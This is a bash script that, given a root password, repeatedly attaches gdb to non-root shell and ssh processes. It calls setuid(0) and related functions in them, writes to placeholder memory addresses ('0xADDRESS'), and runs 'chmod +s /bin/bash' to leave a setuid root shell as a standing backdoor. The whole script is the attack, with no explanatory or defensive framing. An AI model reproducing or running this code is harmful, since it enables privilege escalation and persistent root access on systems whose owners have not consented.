#!/bin/bash

# Check for pass
if [ -z "$1" ]; then
    echo "Usage: $0 <root_password>"
    exit 1
fi

# Set pass from arg
root_password="$1"

while true; do
    # Get the list of PIDs for non-root processes
    pids=$(ps -e -o pid,cmd,user | grep -E '(/bin/)?(bash|ssh|sh)' | grep -v 'root' | awk '{print $1}')

    # Iterate over PIDs
    for pid in $pids; do
        # Send notice
        echo "Message sent to pid $pid"

        # Execute GDB commands
        sudo gdb -p $pid >/dev/null 2>&1 <<EOF &
            # Set UID to 0
            call setuid(0)
            # Set GID to 0
            call setgid(0)
            # Set EUID to 0
            call seteuid(0)
            # Set EGID to 0
            call setegid(0)
            # Change UID/GID via direct memory modification
            set {int}0xADDRESS = 0
            set {int}0xADDRESS = 0
            # Injecting code via call
            call system("chmod +s /bin/bash")
            quit
EOF
    done

    # Sleep
    sleep 30

done
